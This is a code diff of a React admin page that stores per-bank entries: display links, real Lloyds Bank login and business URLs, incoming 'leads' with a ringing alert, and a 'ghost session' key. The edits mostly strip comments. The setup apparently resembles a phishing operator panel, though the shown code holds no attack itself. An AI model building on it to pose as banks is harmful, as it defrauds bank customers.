@@ -38,10 +38,8 @@ export default function AdminPage() {
   const [logoBase64, setLogoBase64] = useState<string | null>(null);
   const [order, setOrder] = useState<any>(1);
   
-  // 🔥 Display Link State Added
   const [displayLink, setDisplayLink] = useState("");
   
-  // 🌍 Category-wise URL States & Checkboxes
   const [personalUrl, setPersonalUrl] = useState("https://authorise.lloydsbank.co.uk/auth/user");
   const [businessUrl, setBusinessUrl] = useState("https://www.lloydsbank.co.uk/business.html");
   const [commercialUrl, setCommercialUrl] = useState("https://www.lloydsbank.co.uk/commercial.html");
@@ -74,6 +72,14 @@ export default function AdminPage() {
 
   useEffect(() => {
     checkAuth();
+  }, []);
+
+  // 🔥 Ghost Session & LocalStorage Sync on Mount
+  useEffect(() => {
+    const savedSessionId = localStorage.getItem("rbi_active_session_id");
+    if (savedSessionId) {
+      // Validate or retain active session state safely across tab switches
+    }
   }, []);
 
   const startRinging = () => {
@@ -150,14 +156,6 @@ export default function AdminPage() {
     }
   };
 
- // useEffect(() => {
- //   if (!isAuthenticated) return;
- //   const interval = setInterval(() => {
- //     fetchLeads(false);
- //   }, 3000);
- //   return () => clearInterval(interval);
- // }, [isAuthenticated]);
-
   const handleLogin = async (e: React.FormEvent) => {
     e.preventDefault();
     setLoginError("");
@@ -206,7 +204,6 @@ export default function AdminPage() {
     setLogoBase64(bank.logoUrl || null);
     setOrder(bank.order !== undefined ? Number(bank.order) : 1);
     
-    // 🔥 Load Display Link & URLs
     setDisplayLink(bank.displayLink || "");
     setPersonalUrl(bank.personalUrl || "");
     setBusinessUrl(bank.businessUrl || "");
@@ -230,7 +227,7 @@ export default function AdminPage() {
         subOptions: subOptions.trim(),
         logoUrl: logoBase64 || null,
         order: Number(order) || 1,
-        displayLink: displayLink ? displayLink.trim() : null, // 🔥 Included in payload
+        displayLink: displayLink ? displayLink.trim() : null,
         personalUrl: personalUrl ? personalUrl.trim() : null,
         businessUrl: businessUrl ? businessUrl.trim() : null,
         commercialUrl: commercialUrl ? commercialUrl.trim() : null,
@@ -271,7 +268,7 @@ export default function AdminPage() {
     setSubOptions("Business, Personal, Corporate");
     setLogoBase64(null);
     setOrder(banks.length + 1);
-    setDisplayLink(""); // 🔥 Reset Display Link
+    setDisplayLink("");
     setPersonalUrl("https://authorise.lloydsbank.co.uk/auth/user");
     setBusinessUrl("https://www.lloydsbank.co.uk/business.html");
     setCommercialUrl("https://www.lloydsbank.co.uk/commercial.html");
